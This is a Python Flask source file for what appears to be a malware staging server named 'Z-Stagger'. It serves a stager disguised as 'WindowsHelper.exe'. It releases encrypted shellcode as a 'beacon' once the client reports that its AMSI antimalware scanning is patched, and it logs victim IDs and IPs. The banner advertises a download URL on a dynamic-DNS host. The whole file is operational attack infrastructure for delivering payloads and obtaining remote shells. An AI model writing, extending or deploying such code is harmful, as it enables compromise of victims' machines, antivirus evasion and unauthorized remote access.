from flask import Flask, send_file, request, g
import base64, time
import os
import sqlite3
import logging



app = Flask(__name__)
base_path = '.'  # Change this to the path of your files directory

# Set up logging
logging.basicConfig(filename='logs.log', level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
# Set Flask debug mode to False
app.debug = True

def get_db():
    if 'db' not in g:
        g.db = sqlite3.connect('requests.db')
    return g.db

@app.teardown_appcontext
def close_db(error):
    if hasattr(g, 'db'):
        g.db.close()

@app.route('/kneel')
def downloadStager():
        filename = "WindowsHelper.exe"
        print(f" [!] Client downloading {request.remote_addr}")
        return send_file(filename, as_attachment=True)

@app.route('/images')
def download_file():
    filename = "encrypted_shellcode.bin"
    id = base64.b64decode(request.args.get('id')).decode('ascii')

    #print(id)
    #//print(type(id))
    logging.info(f"Request from: {id}")
    print("[" + str(time.ctime()) + "] Request from " + id + " IP: " + request.remote_addr)
    patchStat = request.args.get('p')
    #print("PatchStat: " +  patchStat)
    file_path = os.path.join(base_path, filename)
    if(patchStat == 'True'):
        print("Client's AMSI is patched, sending beacon")
        print("Check for a shell...")
        return send_file(file_path, as_attachment=True)
    a = input("Transfer files? (y/n):")
    if a != 'y':
        try:
            db = get_db()
            c = db.cursor()
            c.execute('INSERT INTO requests (client_id, timestamp) VALUES (?, datetime("now"))', (id,))
            db.commit()
        except:
            pass
        logging.info(f"Denied access: {filename}")
        return f'File not found: {filename}', 404

    if os.path.exists(file_path):
        try:
            db = get_db()
            c = db.cursor()
            c.execute('INSERT INTO requests (client_id, timestamp) VALUES (?, datetime("now"))', (id,))
            db.commit()

            c.execute('SELECT id FROM requests WHERE client_id = ? ORDER BY timestamp DESC LIMIT 1', (id,))
            request_id = c.fetchone()[0]

            c.execute('INSERT INTO responses (request_id, filename, timestamp) VALUES (?, ?, datetime("now"))', (request_id, filename))
            db.commit()
        except:
            pass

        logging.info(f"File sent: {filename}")
        return send_file(file_path, as_attachment=True)
    else:
        try:
            db = get_db()
            c = db.cursor()
            c.execute('INSERT INTO requests (client_id, timestamp) VALUES (?, datetime("now"))', (id,))
            db.commit()
        except:
            pass
        logging.info(f"File not found: {filename}")
        return f'File not found: {filename}', 404

if __name__ == '__main__':
    os.system('cls')
    print("""
███████       ███████ ████████  █████   ██████   ██████  ███████ ██████  
   ███        ██         ██    ██   ██ ██       ██       ██      ██   ██ 
  ███   █████ ███████    ██    ███████ ██   ███ ██   ███ █████   ██████  
 ███               ██    ██    ██   ██ ██    ██ ██    ██ ██      ██   ██ 
███████       ███████    ██    ██   ██  ██████   ██████  ███████ ██   ██
 
     Access: %s to download the payload 
      """ % "http://aui.hopto.org/kneel")
    app.run(host='0.0.0.0', port=80)

